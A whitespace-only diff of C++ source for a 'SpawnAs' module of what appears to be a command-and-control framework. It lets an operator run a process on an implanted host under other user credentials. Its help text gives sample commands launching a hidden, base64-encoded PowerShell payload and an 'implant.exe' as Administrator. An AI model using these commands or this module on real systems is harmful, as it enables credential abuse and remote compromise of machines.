@@ -43,9 +43,9 @@ __attribute__((visibility("default"))) SpawnAs* SpawnAsConstructor()
 
 SpawnAs::SpawnAs()
 #ifdef BUILD_TEAMSERVER
-	: ModuleCmd(std::string(moduleName), moduleHash)
+    : ModuleCmd(std::string(moduleName), moduleHash)
 #else
-	: ModuleCmd("", moduleHash)
+    : ModuleCmd("", moduleHash)
 #endif
 {
 }
@@ -56,21 +56,21 @@ SpawnAs::~SpawnAs()
 
 std::string SpawnAs::getInfo()
 {
-	std::string info;
+    std::string info;
 #ifdef BUILD_TEAMSERVER
-	info += "spawnAs:\n";
-	info += "Launch a new process as another user, with the given credentials. \n";
-	info += "exemple:\n";
-	info += "- spawnAs DOMAIN\\Username Password powershell.exe -nop -w hidden -e SQBFAFgAIAAoACgA...\n";
+    info += "spawnAs:\n";
+    info += "Launch a new process as another user, with the given credentials. \n";
+    info += "exemple:\n";
+    info += "- spawnAs DOMAIN\\Username Password powershell.exe -nop -w hidden -e SQBFAFgAIAAoACgA...\n";
     info += "- spawnAs .\\Administrator Password C:\\Users\\Public\\Documents\\implant.exe\n";
 #endif
-	return info;
+    return info;
 }
 
 int SpawnAs::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 {
     if (splitedCmd.size() >= 4)
-	{
+    {
         // format DOMAIN\Username Password
         string usernameDomain="";
         string password="";
@@ -107,25 +107,25 @@ int SpawnAs::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
                 programToLaunch+=" ";
             programToLaunch+=splitedCmd[idx];
         }
-		
+        
         c2Message.set_instruction(splitedCmd[0]);
         c2Message.set_cmd(cmd);
-		c2Message.set_data(programToLaunch.data(), programToLaunch.size());
-	}
-	else
-	{
-		c2Message.set_returnvalue(getInfo());
-		return -1;
-	}
+        c2Message.set_data(programToLaunch.data(), programToLaunch.size());
+    }
+    else
+    {
+        c2Message.set_returnvalue(getInfo());
+        return -1;
+    }
 
-	return 0;
+    return 0;
 }
 
 
 //TODO look at https://github.com/antonioCoco/RunasCs/blob/master/RunasCs.cs
 int SpawnAs::process(C2Message &c2Message, C2Message &c2RetMessage)
 {
-	std::string cmd = c2Message.cmd();
+    std::string cmd = c2Message.cmd();
     const std::string payload = c2Message.data();
 
     std::vector<std::string> splitedList;
@@ -195,11 +195,11 @@ int SpawnAs::process(C2Message &c2Message, C2Message &c2RetMessage)
 
     result += "Success.\n";
 
-	c2RetMessage.set_instruction(c2RetMessage.instruction());
+    c2RetMessage.set_instruction(c2RetMessage.instruction());
     cmd += " ";
     cmd += payload;
-	c2RetMessage.set_cmd(cmd);
-	c2RetMessage.set_returnvalue(result);
-	return 0;
+    c2RetMessage.set_cmd(cmd);
+    c2RetMessage.set_returnvalue(result);
+    return 0;
 }
 
